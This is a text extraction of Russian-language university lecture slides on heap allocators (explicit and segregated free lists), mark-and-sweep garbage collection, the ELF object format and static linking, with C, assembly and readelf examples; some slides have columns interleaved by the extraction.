     размеров этих блоков

• Метод 4: Сортировка блоков по размеру
   – Можно использовать сбалансированное дерево (например,
     Красно-Черные деревья) с указателями в каждом свободном
     блоке, и с длиной блока в качестве ключа                        5
                                                                          © 2024 МГУ/ВМК/СП




          Явный список свободных блоков
    Занятый блок (как и ранее)                  Свободный
            Размер     a                        Размер      a
                                               Следующий
            Полезная                           Предыдущий
             нагрузка
         и выравнивание


            Размер     a                        Размер      a

• Поддерживаем список (списки) свободных блоков, а не всех
  существующих в памяти на данный момент
   – «Следующий» свободный блок может быть где угодно
       • Необходимо поддерживать не только размер текущего блока, но и указатели
         в оба направления: вперед и назад
   – Граничные теги все также необходимы для слияния
   – Поскольку отслеживаются только свободные блоки, можно хранить
     указатели в пространстве, отведенном под полезную нагрузку
                                                                                   6
                                                                     © 2024 МГУ/ВМК/СП




           Явный список свободных блоков

• Логическая организация
                  A          B           C




• Физическое размещение: блоки могут быть
  размещены в произвольных местах и в
  произвольном порядке
                                                           Ссылки вперед
                                                           (следующий блок)
     A                                                 B
16       16 16   16 24           24 16       16 16         16
                         C
                                                     Ссылки назад
                                                     (предыдущий блок)       7
                                                           © 2024 МГУ/ВМК/СП



        Явный список свободных блоков
              Выделение памяти
  До                    Схематичное представление списка




После                    (происходит расщепление блока)




          = malloc(…)
                                                                   8
                                                              © 2024 МГУ/ВМК/СП



        Явный список свободных блоков
            Освобождение памяти
• Правила вставки блока: В какое место списка
  следует поместить освобожденный блок?
  – В порядке LIFO (last-in-first-out)
      • Помещаем освобожденный блок в начало списка
      • За: простота реализации и константное время работы
      • Против: Исследования показывают, что возникает более сильная
        фрагментация по сравнению с тем, когда блоки упорядочены по
        адресам

  – В порядке следования адресов
      • Помещаем в список освобожденный блок так, что список всегда
        поддерживает упорядоченность по адресам:
                   addr(prev) < addr(curr) < addr(next)
      • Против: необходимо искать место вставки
      • За: см. вопрос фрагментации для дисциплины LIFO             9
                                                          © 2024 МГУ/ВМК/СП



              Освобождение блока в порядке LIFO
                        (Случай 1)
  До                                  Схематичное представление
                          free(   )   списка
  Указатель
  на начало
    списка




• Помещаем освобожденный блок в начало списка
 После
 Указатель
 на начало
   списка




                                                                 10
                                                              © 2024 МГУ/ВМК/СП


            Освобождение блока в порядке LIFO
                       (Случай 2)
До                                        Схематичное представление
                           free(    )
                                          списка
Указатель
на начало
  списка




• Извлекаем из списка смежный (перед освобождаемым) в памяти блок,
  выполняем слияние, и вставляем образовавшийся блок в начало
  списка
 После
Указатель
на начало
  списка



                                                                     11
                                                                 © 2024 МГУ/ВМК/СП



               Освобождение блока в порядке LIFO
                          (Случай 3)
  До                                         Схематичное представление
   Указатель
                             free(     )                        списка
   на начало
     списка




• Извлекаем из списка смежный (после освобождаемого) в памяти блок,
  выполняем слияние, и вставляем образовавшийся блок в начало
  списка
  После
  Указатель
  на начало
    списка



                                                                        12
                                                   © 2024 МГУ/ВМК/СП


            Освобождение блока в порядке LIFO
                       (Случай 4)
До
Указатель
                       free(   )
на начало
  списка




• Извлекаем из списка смежные блоки, выполняем слияние
  трех блоков, и вставляем образовавшийся блок в начало
  списка
После
Указатель
на начало
  списка



                                                          13
                                                                      © 2024 МГУ/ВМК/СП



                 Промежуточные итоги
                    Явный список
• В сравнении с неявным списком:
   – Выделение памяти занимает «линейное время» от числа
     свободных, а не всех блоков
      • Гораздо быстрее работает, когда большая часть памяти занята
   – Незначительно усложнилось выделение и освобождение блоков,
     поскольку необходимо извлекать и добавлять элементы в список
   – Требуется дополнительное место для размещения указателей (2
     машинных слова на каждый блок)
      • Увеличивается при этом внутренняя фрагментация?


• Как правило подход с поддержкой явного списка
  комбинируют с разделением блоков по нескольким
  спискам
   – Блоки разделяют на несколько классов, в зависимости от их
     размера
                                                                             14
                                                             © 2024 МГУ/ВМК/СП




       Как отслеживать свободные блоки
• Метод 1: неявный список с использованием длины блока

        20          16        24              8


• Метод 2: Явный список свободных блоков с
  использованием указателей

        20          16        24              8

• Метод 3: Раздельные списки
   – Распределение блоков по раздельным спискам, исходя из
     размеров этих блоков

• Метод 4: Сортировка блоков по размеру
   – Можно использовать сбалансированное дерево (например,
     Красно-Черные деревья) с указателями в каждом свободном
     блоке, и с длиной блока в качестве ключа                       15
                                                        © 2024 МГУ/ВМК/СП




            Раздельные списки (Seglist)

• Блоки каждого класса образуют отдельный список
    4-8


     12


     16


 20 - 32


  36 - 

• Для блоков малого размера заводят по отдельному классу для
  каждого размера
• Для блоков достаточного большого размера границы классов
  идут по степеням двойки                                   16
                                                                  © 2024 МГУ/ВМК/СП




      Выделение памяти по методу Seglist

• Дан массив списков, для каждого класса блоков

• Чтобы выделить блок размера n байт:
   – В соответствующем списке ищем блок размера m >= n
   – Если подходящий блок найден:
      • Расщепляем блок и помещаем оставшийся фрагмент в список
        соответствующего класса
   – Если блок найти не удалось, ищем его в списке следующего класса
   – Повторяем до тех пор, пока не найдем

• Если после просмотра всех списков блок так и не найден:
   – Запрашиваем у ОС дополнительную память для кучи (используя
     функцию sbrk())
   – В предоставленной памяти создаем блок размера n байт
   – Всю оставшуюся память занимаем одним свободным блоком и
     помещаем его в список класса наибольших по размеру блоков (из
     числа подходящих).
                                                                         17
                                                               © 2024 МГУ/ВМК/СП




     Выделение памяти по методу Seglist

• Чтобы освободить блок:
  – При необходимости выполняем слияние и помещаем блок в
    список подходящего класса размеров

• Преимущества метода Seglist
  – Более высокая пропускная способность
     • Логарифмическая сложность поиска для классов большого
       размера (граница по степеням двойки)
  – Лучшее использование памяти
     • Поиск первого подходящего в раздельных списках показывает
       результаты, схожие с поиском наилучшего в рамка всей кучи
     • Предельная ситуация: если для каждого размера блока завести
       отдельный класс, эффективность расходования памяти будет
       совпадать с поиском наилучшего
                                                                      18
                                       © 2024 МГУ/ВМК/СП




                   Далее …

• Явные списки свободных блоков
• Раздельные списки свободных блоков
• Сборка мусора




                                              19
                                                            © 2024 МГУ/ВМК/СП



           Неявное управление памятью:
                  сборка мусора
• Сборка мусора: автоматическое освобождение памяти,
  выделенной на куче, после того, как программа
  гарантированно не будет этой памятью пользоваться
  void foo() {
     int *p = malloc(128);
     return; /* p указывает на блок, ставший «мусором» */
  }

• Общая практика в функциональных, скриптовых,
  объектно-ориентированных промышленных языках:
   – Java, Python, JS, Go, Swift, …
• Вариации («консервативные» сборщики мусора) были
  созданы для Си и Си++
   – Без гарантий сборки всего мусора


                                                                   20
                                                               © 2024 МГУ/ВМК/СП




                      Сборка мусора

• Каким образом сборщик мусора узнает, что память может
  быть освобождена?
   – В общем случае невозможно спрогнозировать, что будет
     происходить в будущем в программе (например, это будет
     определяться внешними событиями)
   – Но можно однозначно заключить, что блок памяти не будет
     использоваться, если в программе больше нет ни одного
     указателя, на этот блок ссылающегося

• Требуются некоторые допущения об использующихся в
  программе указателях
   – Менеджер памяти должен уметь различать указатели и все
     остальное (целые числа)
   – Все указатели должны указывать на начало блока
   – Недопустимо прятать указатели
     (например, приведением типа к int, а затем обратно к указателю)


                                                                      21
                                                             © 2024 МГУ/ВМК/СП




   Классические алгоритмы сборки мусора

• Алгоритм пометок (Mark-and-sweep, McCarthy, 1960)
   – Не перемещает блоки
• Подсчет ссылок (Collins, 1960)
   – Не перемещает блоки (не рассматривается)
• Сборка копированием (Minsky, 1963)
   – Перемещает блоки (не рассматривается)
• Поколения объектов (Lieberman and Hewitt, 1983)
   – Алгоритм сборки учитывает время жизни объектов
     (выделенных блоков)
      • Большинство выделенных блоков данных крайне скоро
        освобождается
      • Поиск недостижимых объектов в первую очередь просматривает
        пространство памяти с недавно выделенными блоками

                                                                    22
                                                                             © 2024 МГУ/ВМК/СП




           Рассматриваем память как граф …

• Рассматриваем память как направленный граф
     – Каждый выделенный блок – вершина графа
     – Каждый указатель – ребро графа
     – Память вне кучи, в которой содержатся указатели, рассматривается в качестве
       корневых узлов (регистры, автоматические локальные переменные на стеке,
       глобальные переменные)
     Корневые узлы


     Узлы в куче                                                        достижимый

                                                                        недостижимый
                                                                        («мусор»)




Узел (блок выделенной памяти) достижим, если существует путь от некоторого
корневого узла до него.
Недостижимые узлы рассматриваются как мусор (поскольку не могут быть                23
использованы программой)
                                                                           © 2024 МГУ/ВМК/СП




                          Алгоритм пометок
  • Может быть реализован поверх функций malloc/free
      – Выделяем память функцией malloc до тех пор, пока вся память не «кончится»
  • Когда свободного места не осталось:
      – Используем дополнительный бит пометки в заголовке каждого блока
      – Разметка: Начиная с корневых узлов, проходим по всем достижимым блокам
        и ставим пометки
      – Чистка: Просматриваем все блоки и освобождаем все непомеченные
                                  корневой узел                    Замечание: в данном
                                                                   примере стрелками
                                                                   обозначены
До разметки                                                        указатели на память,
                                                                   а не только на
                                                                   свободные блоки

                                                                          Установлен
После разметки
                                                                          бит пометки




После чистки          свободный               свободный                           24
                                                                  © 2024 МГУ/ВМК/СП



       Предположения, необходимые для
            модельной реализации
• Команды, доступные пользовательской программе
  – new(n) возвращает указатель на новый блок с пустым содержимым
  – read(b,i) считывает значение, размещенное по смещению i в блоке b
  – write(b,i,v) записывает величину v по смещению i в блок b

• Каждый блок снабжен заголовком
  – Заголовок (одно слово) адресуется как b[-1], для любого блока b
  – В различных алгоритмах сборки мусора заголовок может
    использоваться по-разному

• Команды, используемые Сборщиком Мусора
  – is_ptr(p) определяет, является ли p указателем
  – length(b) возвращает длину блока b, не включая заголовок
  – get_roots() возвращает список всех корневых объектов


                                                                         25
                                                                     © 2024 МГУ/ВМК/СП




    Модельная реализация алгоритма пометок
 Помечаем, обходя в глубину граф памяти
ptr mark(ptr p) {
   if (!is_ptr(p)) return;         // если не указатель, то ничего не делаем
   if (markBitSet(p)) return;      // нет ли уже выставленной пометки?
   setMarkBit(p);                  // выставляем пометку
   for (i=0; i < length(p); i++)   // рекурсивно вызываем на всех словах
     mark(p[i]);                   // данного блока
   return;
}


 Чистим, используя функцию длины для перехода на следующий блок
  ptr sweep(ptr p, ptr end) {
     while (p < end) {
        if markBitSet(p)
           clearMarkBit();
        else if (allocateBitSet(p))
           free(p);
        p += length(p);
  }
                                                                            26
                                                                       © 2024 МГУ/ВМК/СП



    Консервативный алгоритм пометок для
                Си программ
• «Консервативный сборщик мусора» для Си программ
   – is_ptr() определяет, что машинное слово – указатель, через проверку,
     является ли это число начальным адресом выделенного блока памяти
   – Но в языке Си указатели могут указывать в середину блока
                                указатель
                   Заголовок




• Как можно найти начало блока?
   – Можно поддерживать в памяти сбалансированное двоичное дерево для
     отслеживания всех выделенных блоков памяти (ключом является адрес
     начала блока)
   – Указатели сбалансированного дерева могут храниться в заголовке
     (потребуются два дополнительных слова)
            Заголовок Содержимое блока
            Size
                                                Left: меньшие адреса
                                                                              27
             Left       Right
                                                Right: большие адреса
                                                    © 2024 МГУ/ВМК/СП




                                Далее

• Система программирования
• Что делают компилятор и ассемблер
• Формат хранения объектного кода
   – ELF
   – Символы
• Статическая компоновка
   – Разрешение символов
   – Выделение памяти
   – Перебазирование символов
• Архивы
• Загрузка исполняемого файла
• Динамическая компоновка
   –   Динамические библиотеки
   –   Позиционно независимый код
   –   Ленивое связывание
   –   Динамическая компоновка времени исполнения

                                                           28
                                                                                       © 2024 МГУ/ВМК/СП




              Система программирования
• Система программирования – система, образуемая языком
  программирования, компиляторами или интерпретаторами
  программ, представленных на этом языке, соответствующей
  документацией, а также вспомогательными средствами для
  подготовки программ к форме, пригодной для выполнения
  (ГОСТ 19781-90 Обеспечение систем обработки информации
  программное. Термины и определения)
• (неформально) Система программирования – комплекс средств
   – Язык программирования
       • Информационные ресурсы
       • Программные инструменты
       • Библиотеки
   – Системные/прикладные программы
       • Операционная система (среда функционирования)
       • Программные средства разработки
• Этапы жизненного цикла программы                                                         Пример:
   – Проектирование                                                        разработка, управляемая
       • Сбор и анализ требований к программе                             функциональностью (FDD)
       • Разработка
   – Реализация                           Разработка       Разработка
                                                                                   Планирование
                                         архитектуры     списка функций
       • Кодирование
       • Отладка
   – Сопровождение
                                                                                  Кодирование и
                                                            Дизайн
                                                                                   тестирование
                                                                                              29
                                             © 2024 МГУ/ВМК/СП




         Система программирования языка Си
• Язык Си использует независимую
  компиляцию. Обращение к
  глобальным переменным и
  функциям выполняется, исходя из
  их объявления.
• Невозможно проверить
  соответствие объявления функции
  и ее реализации, когда они
  размещены в разных модулях.




                                                    30
                       © 2024 МГУ/ВМК/СП




Выполнение программы




                              31
                                                                                      © 2024 МГУ/ВМК/СП




                                  Компиляция
•   Компиляция – трансляция программы с языка высокого уровня в форму,
    близкую к программе, на машинном языке (ГОСТ 19781-90)
     –   Построение по Си-коду ассемблерного листинга
•   В языке Си: определения и объявления глобальных, статических и локальных
    статических переменных
     –   На уровне ассемблера: создание помеченных областей статической памяти
         соответствующего размера
•   В языке Си: определение функции
     –   На уровне ассемблера: построение соответствующего кода            Приведены спецификаторы
•   Области видимости по умолчанию в Си и                                  соглашения вызова,
                                                                           используемые в компиляторе
    ассемблере отличаются                                                  MS Visual Studio
•   Преобразование имен переменных в метки                        _f:
    декорирование имен (name mangling)                               xor    eax, eax
     –   Си@Linux: имена не меняются                                 ret
     –   Си@Windows
                                                                  _g@4:
          int __cdecl    f (int x) { return 0; }
          int __stdcall g (int y) { return 0; }
                                                                     xor eax, eax,
          int __fastcall h (int z) { return 0; }                     ret 4
     –   Си++, восстановление имен – утилита c++filt              @h@4:
          int __cdecl Fx_i(int (__cdecl*)(int))                      xor    eax, eax
                                                                     ret
                 ?Fx_i@@YAHP6AHH@Z@Z:                                                        32
                                                                                    © 2024 МГУ/ВМК/СП




                  Схема работы ассемблера

• Проблема: опережающие ссылки
• Первый проход: частичная трансляция команд, составление таблицы
  символов, таблицы ссылок, таблицы строк, …
   – Символ
       •   Имя, идентификатор (строка символов)
       •   Адрес, с которым соотнесено имя
       •   Размер
       •   Видимость из других модулей (связывание) - глобальный/локальный символ
   – Описание символов собрано в таблице символов
   – Определяются размеры секций
   – Составляется таблица использований (ссылок) символов в операндах
     относительной и абсолютной адресации
• Второй проход: построение объектного кода
   – Заполнение ссылок на символы, когда определение символа и обращение к
     нему (ссылка) размещены в одной секции, а адресация – относительная
   – Файл с объектным кодом должен хранить содержимое секций и служебную
     информацию: где используются ссылки и на что они ссылаются, с какие места
     секций были помечены и какими именно метками

                                                                                           33
                                                                   © 2024 МГУ/ВМК/СП




            Пример Си-программы

main.c                                     swap.c
int buf[2] = {1, 2};                       extern int buf[];
char str[] = "Hello";
char *p    = "world";                      int *bufp0 = &buf[0];
                                           static int *bufp1;
int swap(char*, char*);
                                           void swap() {
int main(int argc, char* argv[]) {            int temp;
   if (argc > 1) {
      swap(str, p);                            bufp1 = &buf[1];
   }                                           temp = *bufp0;
   return 0;                                   *bufp0 = *bufp1;
}                                              *bufp1 = temp;
                                           }
             Код программы содержит
             намеренно внесенную ошибку.

                                                                          34
                                                                  © 2024 МГУ/ВМК/СП

               Частичная трансляция команд
main:                            00000000 <main>:
   lea     ecx,[esp+0x4]            0:   8d 4c 24 04
   and     esp,0xfffffff0           4:   83 e4 f0 Кодируем в двоичном
   push    dword [ecx-0x4]          7:   ff 71 fc виде:
   push    ebp                      a:   55        • коды операций;
   mov     ebp,esp                  b:   89 e5     • адресный код операндов,
   push    ecx                      d:   51          не содержащий меток.
   sub     esp,0x4                  e:   83 ec 04
   cmp     dword [ecx],0x1         11:   83 39 01
   jle     .L2                     14:   7e **                       main.L2
   push    eax                     16:   50
   push    eax                     17:   50
   push    dword [p]               18:   ff 35 ** ** ** **         p
   push    str                     1e:   68 ** ** ** **           str
   call    swap                    23:   e8 ** ** ** **          swap
   add     esp,0x10                28:   83 c4 10
.L2:
   mov     ecx,dword [ebp-0x4]     2b:   8b 4d fc
   xor     eax,eax                 2e:   31 c0
   leave                           30:   c9
   lea     esp,[ecx-0x4]           31:   8d 61 fc                        35
   ret                             34:   c3
                                                                      © 2024 МГУ/ВМК/СП

                 Построение объектного кода
int buf[2] = {1, 2};
main:                              00000000 <main>:
char str[] = "Hello";
   lea     ecx,[esp+0x4]              0:   8d 4c 24 04           Таблица
char *p    = "world";
   and     esp,0xfffffff0             4:   83 e4 f0             символов

intpush    dwordchar*);
    swap(char*,  [ecx-0x4]            7:   ff 71 fc                 buf
   push    ebp                        a:   55                        p
intmov     ebp,esp
    main(int argc, char* argv[]) {    b:   89 e5                    str
   if (argc
   push     >
           ecx1) {                    d:   51
                                                                  swap
   subswap(str, p);
           esp,0x4                    e:   83 ec 04
   }                                                              main
   cmp     dword [ecx],0x1           11:   83 39 01
   return 0;
   jle     .L2                       14:   7e 15
}
   push    eax                       16:   50                        Таблица
   push    eax                       17:   50                         ссылок
   push    dword [p]                 18:   ff 35 ** ** ** **            №1
   push    str                       1e:   68 ** ** ** **               №2
   call    swap                      23:   e8 ** ** ** **               №3
   add     esp,0x10                  28:   83 c4 10
.L2:                                                 Работоспособный код
   mov     ecx,dword [ebp-0x4]       2b:   8b 4d fc указанных команд не может
   xor     eax,eax                   2e:   31 c0     быть построен ассемблером .
   leave                             30:   c9        Компоновщик окончательно
   lea     esp,[ecx-0x4]             31:   8d 61 fc заполнит в командах байты,
                                                                             36
   ret                               34:   c3        относящееся  к ссылкам.
                                                                    © 2024 МГУ/ВМК/СП




    Три типа объектных файлов (модулей)

• Перемещаемые объектные файлы (.o-файлы)
   – Содержит код и данные в форме, позволяющей проводить
     компоновку с другими перемещаемым объектными файлами.
      • Каждый .o-файл производится из одного файла с исходным кодом (.c-
        файла)
• Исполняемые объектные файлы
   – Содержит код и данные в такой форме, что их можно напрямую
     копировать в память и запускать выполнение программы.

– Разделяемые объектные файлы (.so-файлы)
   – Особый вид перемещаемого объектного файла, который может быть
     загружен в память и скомпонован с программой динамически, во
     время ее загрузки и во время работы.
   – Windows - Dynamic Link Libraries (DLL)

                                                                            37
                                            © 2024 МГУ/ВМК/СП




     Executable and Linkable Format (ELF)

• Стандартный бинарный формат объектных
  файлов
• Был предложен в AT&T System V Unix
  – Позже был поддержан в BSD и Linux
• Единый формат для
  – Перемещаемых объектных файлов (.o),
  – Исполняемых объектных файлов
  – Разделяемых объектных файлов (.so)



                                                   38
                                                                       © 2024 МГУ/ВМК/СП


                         Формат ELF файла
• Заголовок Elf
   – Размер машинного слова, порядок байт, тип
     файла (.o, исполняемый, .so), и др.
                                                                                      0
• Таблица заголовков сегментов                          Заголовок ELF
   – Размер страницы, сегменты виртуальной        Таблица заголовков сегментов
     памяти, размеры сегментов.                   (необходима в исп. файлах)
• Секция .text                                          секция .text
   – код                                               секция .rodata
• Секция .rodata                                        секция .data
   – Данные, доступные только на чтение:
     таблицы переходов, константы                        секция .bss

• Секция .data                                         секция .symtab
   – Инициализированные глобальные                    секция .rel.txt
     переменные
                                                      секция .rel.data
• Секция .bss
   – Неинициализированные глобальные                    секция .debug
     переменные
   – У секции есть заголовок, на сама секция не   Таблица заголовков секций
     занимает места
                                                                              39
                                                                     © 2024 МГУ/ВМК/СП


         Формат ELF файла (продолжение)

• Секция .symtab
   – Таблица символов                                                               0
                                                     Заголовок ELF
   – Имена функций и статических переменных
   – Имена секций                             Таблица заголовков сегментов
                                               (необходима в исп. файлах)
• Секция .rel.text
   – Данные для перемещения ссылок в секции           секция .text
     .text
                                                     секция .rodata
   – Адреса обновляемых операндов в
     двоичном коде инструкций                         секция .data
• Секция .rel.data                                    секция .bss
   – Данные для перемещения ссылок в секции
     .data                                           секция .symtab
   – Адреса глобальных переменных,
     инициализированных ссылками на                  секция .rel.txt
     внешние функции или глобальные
     переменные                                     секция .rel.data
• Секция .debug                                      секция .debug
   – Данные для символьного отладчика
     (gcc -g)                                  Таблица заголовков секций
• Таблица заголовков секций                                                 40
   – Смещения и размеры каждой секции
              © 2024 МГУ/ВМК/СП




Лекция 0x11


 13 апреля
                                                                     © 2024 МГУ/ВМК/СП




              Статическая компоновка
• Программа транслируется и компонуется драйвером компилятора:
   – unix> gcc –O3 -g -o p main.c swap.c
   – unix> ./p

     main.c                 swap.c         Файлы с исходным кодом


    Трансляторы          Трансляторы
    (cpp, cc1, as)       (cpp, cc1, as)
                                          Независимо друг от друга
       main.o               swap.o        откомпилированные
                                          файлы с перемещаемым
                                          объектным кодом
          Компоновщик (ld)

                              Полностью скомпонованный исполняемый
                     p        объектный файл
                              (содержит код и данные всех функций            2
                              определенные в main.c и swap.c)
                                                          © 2024 МГУ/ВМК/СП




     Почему нужен компоновщик?

• Причина 1: Модульность программы

  – Программа может быть организована как набор
    небольших файлов с исходным кодом, а не один
    монолитный файл.

  – Есть возможность организовывать библиотеки
    функций, являющихся общими для разных программ
     • например, библиотека математических функций, стандартная
       библиотека языка Си


                                                                  3
                                                         © 2024 МГУ/ВМК/СП




     Почему нужен компоновщик?

• Причина 2: Эффективность

  – Время: Раздельная компиляция
     • Меняем код в одном файле, компилируем только его,
       повторяем компоновку
     • Нет необходимости повторять компиляцию остальных файлов
       с исходным кодом.

  – Место на диске: Библиотеки
     • Общие функции можно объединить в одном файле...
     • Исполняемые файлы и образ программы в памяти содержит
       только те функции, которые действительно используются.

                                                                 4
                                                                    © 2024 МГУ/ВМК/СП



         Что делает компоновщик?
• Шаг 1. Разрешение символов
   – В ассемблерной программе определяют и используют символы
     (переменные и функции):
      • void swap() {…}       /* определение символа swap */
      • swap(str, p);         /* ссылки на символы */
      • int *bufp0 = &buf[0]; /* определение символа bufp0, ссылка на buf */
   – Определения символов сохраняются в таблице символов.
      • Таблица символов – массив структур
      • Каждая запись содержит имя, размер, позицию символа.
   – Компоновщик устанавливает связь каждой ссылки на символ с
     единственным определением символа.

   typedef struct {
      int name;      /* Смещение в таблице строк */
      int value;     /* Смещение в секции или виртуальный адрес */
      int size;      /* Размер в байтах */
      char type:4,   /* Данные, код, секция, имя файла */
      binding:4;     /* Локальный или глобальный символ */
      char reserved; /* Не используется */
      char section; /* Номер заголовка секции, ABS, UNDEF, COMMON */
   } Elf_Symbol;                                                            5
                                                                  © 2024 МГУ/ВМК/СП




           Что делает компоновщик?

• Шаг 2. Перемещение
    – Несколько объявлений секций кода и данных объединяются
      в единые секции
    – Символы перемещаются с их относительных позиций в .o
      файлах на абсолютные адреса в исполняемом файле.
    – Обновляются (перебазируются) все ссылки на символы,
      согласно их новым позициям.

typedef struct {
   int offset;    /* Смещение перебазируемой ссылки в секции */
   int symbol:24, /* Номер символа в таблице */
   type:8;        /* Тип перебазирования */
} Elf32_Rel;


                                                                          6
                                                             © 2024 МГУ/ВМК/СП




         Символы в процессе компоновки
• Глобальные символы
  – Символы определенные в одном модуле таким образом, что их
    можно использовать в других модулях.
  – Например: не-static Си-функции и не-static глобальные
    переменные.
• Локальные символы
  – Символы определены и используются исключительно в одном
    модуле.
  – Например: Си-функции и переменные, определенные с
    модификатором static.
  – Локальные символы не являются локальными переменными Си-
    программы
• Внешние (неопределенные) символы
  – Глобальные символы, которые используются в модуле, но
    определены в каком-то другом модуле.
  – То, что символ не определен, показывает константа UNDEF в номере
    секции
                                                                     7
                                                                         © 2024 МГУ/ВМК/СП




                    Задача: разрешение символов
       Глобальные                                          Внешний
                        main.c          Глобальный                      Локальный
    int buf[2] = {1, 2};                      extern int buf[];
    char str[] = "Hello";
    char *p    = "world";                     int *bufp0 = &buf[0];
                                              static int *bufp1;
    int swap(char*, char*);
                                              void swap()              Глобальный
    int main(int argc, char* argv[]) {        {
                                                int temp;
       if (argc > 1) {
Внешний swap(str, p);
                                                  bufp1 = &buf[1];
       }                Для компоновщика
                                                  temp = *bufp0;
       return 0;       переменной temp не         *bufp0 = *bufp1;
    }                          существует         *bufp1 = temp;
• Связывание символа:
                                              }
    • local                                                         swap.c
    • global (extern)
• Присутствует ли символ в .symtab?     • Размер?
                                                                                 8
• Модуль, в котором символ определен?   • Смещение внутри секции?
                                                                   © 2024 МГУ/ВМК/СП



                Перемещение кода и данных
Перемещаемый объектный файл                 Исполняемый объектный файл
                                        0
                                                  Заголовки

   Системный код      .text                     Системный код

  Системные данные    .data                        main()
                                                                      .text
main.o
                                                   swap()
       main()         .text
                                                … еще немного
world\0              .rodata                   системного кода …
char str[] = "Hello"                        world\0                   .rodata
char *p = ...        .data                     системные даные
int buf[2]={1,2}                            char str[] = "Hello"
                                            char *p = ...             .data
swap.o
                                            int buf[2]={1,2}
       swap()         .text                  int *bufp0=&buf[0]
                      .data                 int *bufp1                .bss
 int *bufp0=&buf[0]
static int *bufp1                                   .symtab
                      .bss                          .debug
                        Даже приватные данные файла swap,                  9
                        требуют размещения в .bss
                                                                                                      © 2024 МГУ/ВМК/СП




      Предварительное определение переменных
extern int i0;            /* объявление переменной */
int i1 = 10;              /* определение, внешнее связывание */
static int i2 = 20;       /* определение, внутреннее связывание */
extern int i3 = 0;        /* определение, внешнее связывание */
int i4;                   /* предварительное определение, внешнее связывание */
static int i5;            /* предварительное определение, внутреннее связывание */
int i1;                   /* корректное предварительное определение */
int i2;                   /* ошибка, неувязка с уже заданным связыванием */
int i3;                   /* корректное предварительное определение */
int i4;                   /* корректное предварительное определение */
int i5;                   /* ошибка, неувязка с уже заданным связыванием */
  •    Что такое переменная?
        –   Си: идентификатор, тип, связывание, значение
        –   Ассемблер: метка/символ, секция, значение
  •    Связывание имен
        –   Внешнее: переменная доступна во всех единицах трансляции
        –   Внутреннее: переменная доступна только в текущей единице трансляции
  •    Объявление переменной с ключевым словом extern не приводит к выделению памяти
  •    Определение
        –   В отсутствии инициализатора, определение трактуется как «предварительное» (tentative definition). В
            отсутствии других определений в данной единице трансляции переменной присваивается нулевое
            значение.
  •    Проблема: сразу в нескольких единицах трансляции могут появиться переменные с
       одинаковыми идентификаторами       Ключевое слово extern в языке Си и ассемблере имеет
  •    Решения                            схожий, но не одинаковый смысл!
        –   Сильные и слабые символы            •   Си: внешнее связывание                                   10
        –   COMMON-символы                      •   Ассемблер: метка/символ, определенный в другом модуле
                                                          © 2024 МГУ/ВМК/СП



             Сильные и слабые символы

• Каждый символ в программе либо «сильный», либо
  «слабый»
    – Сильные: функции и инициализированные глобальные переменные
    – Слабые: неинициализированные глобальные переменные

                p1.c               p2.c
сильный         int foo=5;         int foo;          слабый

сильный         p1() {             p2() {            сильный
                }                  }




                                                                 11
                                                           © 2024 МГУ/ВМК/СП




            Правила работы с символами
• Правило 1: Одинаковые сильные символы запрещены
   – Каждый элемент может быть определен только один раз
   – В противном случае ошибка компоновки
• Правило 2: Один сильный символ и несколько слабых –
  выбираем сильный символ
   – Ссылки на слабые символы заменяются ссылками на сильный
     символ
• Правило 3: Если несколько слабых символов, выбираем
  произвольный
   – На данный момент правила компиляции по умолчанию
     предполагают использование другого механизма – общих
     символов
   – Используемый механизм можно выбирать: gcc –fno-common
                                                                  12
                                                              © 2024 МГУ/ВМК/СП
extern int buf[];

int *bufp0 = &buf[0];
static int *bufp1;

void swap()
{
  int temp;

    bufp1 = &buf[1];
    temp = *bufp0;
    *bufp0 = *bufp1;
    *bufp1 = temp;
}
    snoop@jezek:~/samples/2017/linking$ gcc -c swap.c
    snoop@jezek:~/samples/2017/linking$ readelf -s swap.o

    Symbol table '.symtab' contains 12 entries:
       Num:    Value Size Type     Bind   Vis      Ndx Name
    ...
        10: 00000000     0 NOTYPE GLOBAL DEFAULT   UND buf
    ...

                                                                     13
                                                               © 2024 МГУ/ВМК/СП
extern int buf[];

int *bufp0 = &buf[0];
static int *bufp1;          • COMMON-символы в перемещаемом
int buf[];                    коде не относят к какой-либо реально
void swap()                   существующей секции
{                           • Место в памяти для таких символов
  int temp;
                              выделяется при построении
    bufp1 = &buf[1];          исполняемого кода в общей .bss секции
    temp = *bufp0;          • При «слиянии» COMMON-символов есть
    *bufp0 = *bufp1;          возможность проверить их размер
    *bufp1 = temp;
}
    snoop@jezek:~/samples/2017/linking$ gcc -c swap.c
    snoop@jezek:~/samples/2017/linking$ readelf -s swap.o

    Symbol table '.symtab' contains 12 entries:
       Num:    Value Size Type     Bind   Vis      Ndx Name
    ...
        10: 00000004     4 OBJECT GLOBAL DEFAULT   COM buf
    ...

                                                                      14
                                                                      © 2024 МГУ/ВМК/СП

                          • Отказ от механизма COMMON-символов приводит
                            к «принудительному» выделению памяти в для них
extern int buf[];           в секции .bss
                          • В силу особенностей языка Си и правил построения
int *bufp0 = &buf[0];
static int *bufp1;
                            исполняемого кода, программа выделит в памяти
int buf[];                  место для каждого предварительно определенного
void swap()                 «экземпляра» переменной
{                         • Последствия?
   int temp;
 snoop@jezek:~/samples/2017/linking$ gcc -fno-common -c swap.c
snoop@jezek:~/samples/2017/linking$ readelf -s swap.o
   bufp1 = &buf[1];
   temp table
 Symbol = *bufp0;
              '.symtab' contains 12 entries:
   *bufp0
    Num: = Value
             *bufp1;
                   Size Type    Bind   Vis    Ndx Name
   *bufp1 = temp;
 ...
}    10: 00000000     4 OBJECT GLOBAL DEFAULT   5 buf
...
snoop@jezek:~/samples/2017/linking$ readelf -S swap.o
There are 13 section headers, starting at offset 0x24c:

Section Headers:
  [Nr] Name              Type            Addr     Off     Size   ES Flg Lk Inf Al
...
  [ 5] .bss              NOBITS          00000000 000070 000008 00   WA   0 15 0     4
...
                                                                        © 2024 МГУ/ВМК/СП




            Задача: слабые и сильные символы
  int x;
  p1() {}       p1() {}          Ошибка компоновки: два сильных символа (p1)


  int x;        int x;           Ссылки на x будут ссылаться на один и тот же
  p1() {}       p2() {}          неинициализированный int. Но какой?

  int x;        double x;
  int y;        p2() {}          Запись в x (p2) может поменять y!
  p1() {}

  int x=7;      double x;        Запись в x (p2) обязательно поменяет y!
  int y=5;      p2() {}
  p1() {}

  int x=7;      int x;           Ссылка на x будет ссылаться на один и тот же
  p1() {}       p2() {}          инициализированный int.

Наихудший сценарий: два одинаковые «слабые» структуры,
откомпилированные разными компиляторами с разными                               16
правилами выравнивания.
